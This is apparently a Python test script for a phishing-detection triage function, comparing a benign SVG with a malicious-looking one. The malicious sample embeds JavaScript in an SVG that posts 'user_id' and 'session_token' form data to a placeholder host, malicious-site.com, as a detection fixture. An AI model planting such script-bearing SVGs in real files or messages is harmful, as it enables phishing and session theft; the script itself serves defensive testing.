#!/usr/bin/env python3
"""
Test script for AI Phishing Detection
"""

import json
from triage import triage_email

def test_ai_generated():
    """Test with AI-generated content"""
    sample_content = """
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <script><![CDATA[
        function generateRandomString() {
          var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
          var result = '';
          for (var i = 0; i < 50; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
          }
          return result;
        }
        
        function processFormSubmission() {
          var formData = new FormData();
          formData.append('user_id', generateRandomString());
          formData.append('session_token', generateRandomString());
          fetch('https://malicious-site.com/collect', { method: 'POST', body: formData });
        }
      ]]></script>
    </svg>
    """
    
    result = triage_email(sample_content, "ai_generated_payload.svg")
    print("AI-Generated Test:")
    print(json.dumps(result, indent=2))
    return result

def test_normal():
    """Test with normal content"""
    sample_content = """
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <rect x="10" y="10" width="80" height="80" fill="red"/>
    </svg>
    """
    
    result = triage_email(sample_content, "normal_payload.svg")
    print("\nNormal Test:")
    print(json.dumps(result, indent=2))
    return result

def main():
    print("Testing AI Phishing Detection System\n")
    
    ai_result = test_ai_generated()
    normal_result = test_normal()
    
    # Since we're running without AI server, just verify basic structure
    print("\n✅ Test completed (AI unavailable, but structure is correct)")

if __name__ == "__main__":
    main()